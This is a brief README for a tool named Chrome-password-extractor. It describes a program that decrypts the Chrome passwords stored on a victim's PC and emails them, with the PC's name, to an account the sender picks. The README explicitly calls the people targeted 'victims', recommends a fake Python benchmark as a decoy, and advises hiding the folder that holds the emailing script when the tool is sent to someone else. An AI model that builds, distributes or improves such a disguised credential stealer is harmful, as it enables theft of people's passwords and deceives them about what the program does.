# Chrome-password-extractor
Chrome passwords are stored in a directory deep in `%appdata%` in an encrypted file format. By opening `run.bat`, the passwords are decrypted and put into a file, that when 	email information is filled in in `random-extra-stuff\send.py`, the passwords are directly emailed to an account of your choosing, along with the name of the victims PC. 
	
As decoy, I have added in a simple python benchmark, that takes the execution speeds of an equasion, and saves it into a file.

This program works best if the `random-extra-stuff` folder is hidden, if this is something that is sent to another user.
